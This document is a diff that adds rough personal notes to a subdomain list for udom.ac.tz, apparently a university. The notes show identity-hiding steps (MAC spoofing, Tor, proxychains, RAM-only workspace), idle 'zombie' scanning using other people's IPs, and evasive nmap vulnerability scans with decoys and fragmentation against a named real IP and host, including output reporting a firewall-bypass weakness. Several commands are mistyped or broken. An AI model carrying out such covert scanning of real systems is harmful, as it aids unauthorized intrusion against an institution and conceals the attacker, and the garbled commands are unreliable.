@@ -82,3 +82,60 @@ meetings.udom.ac.tz
 civeipt.udom.ac.tz
 nuru.udom.ac.tz
 [INF] Found 55 subdomains for udom.ac.tz in 2 minutes 48 seconds
+
+
+
+
+
+HOW TO CHANGE IDENTITY
+install proxychains tor
+install macchanger
+
+execute into RAM memory because is temporary 
+Run into RAM 
+first step change mac address
+by using tools callled macchanger tools changer 
+
+macchanger -r mac address
+
+
+VPN
+us -tor-germany
+curl --socks5 127.0.0.1.9050 ifconfig.me
+
+MAKE FILE WHICH TOOLS WILL RUN
+mkdir /tmp/ramscan && mount
+-t tmpts -o size=1G tmpts
+tmp/ramscan
+cd /tmp/ramscan
+
+ZOMBIES SCANING
+nmap -sI zombiesipfolder
+where this zombiesfolder am should get ipaddress of many people 
+create script to scann vurnebility
+CREATE switch to create  report after scanning the target 
+
+scanning using script
+ nmap -f -D -Pn  RND:10 -sS -p 443 -T4   --script vuln 41.78.64.11 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 15:15 EAT
+Failed to resolve decoy host "-Pn": Name or service not known
+QUITTING!
+                                                                                   
+┌──(engshedracc㉿Engshedracc)-[~]
+└─$ nmap -f -D RND:10 -sS -p 443 -T4   --script vuln sr2.udom.ac.tz   
+
+AFTER SCANNING 
+ nmap -f -D   RND:10 -sS -p 443 -T4   --script vuln -Pn  41.78.64.11 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 15:21 EAT
+Nmap scan report for 41.78.64.11
+Host is up.
+
+PORT    STATE    SERVICE
+443/tcp filtered https
+
+Host script results:
+| firewall-bypass: 
+|_  Firewall vulnerable to bypass through ftp helper. (IPv4)
+
+Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds
+                                                                  
